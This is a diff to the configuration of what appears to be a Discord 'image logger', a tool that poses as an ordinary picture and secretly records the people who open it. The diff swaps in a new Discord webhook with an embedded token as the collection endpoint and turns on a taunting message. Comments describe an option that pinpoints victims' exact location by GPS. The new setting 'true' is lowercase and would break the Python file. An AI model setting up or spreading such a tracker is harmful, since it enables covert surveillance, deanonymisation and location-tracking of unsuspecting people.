@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1401633592051761185/7bFuHr2QmHk2ENtaoJKNDCu8sFaWNUZnNGaBDoMQLPZB9Sq4H4aCHXXeTdgpBQcHawjx",
+    "webhook": "https://discord.com/api/webhooks/1416368483717087343/79nOw_7b3PuGE84hzTqT5WSLvH38ozZVwzCgdiiXLDA9QL9l0wuJ73T5f42SxGo4EvoR",
     "image": "https://cdn.pixabay.com/photo/2015/04/23/22/00/tree-736885_1280.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
@@ -28,8 +28,8 @@ config = {
     "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
-        "doMessage": False, # Enable the custom message?
-        "message": "GET LOGGED BOZO....", # Message to show
+        "doMessage": true, # Enable the custom message?
+        "message": "SunyIsHere", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
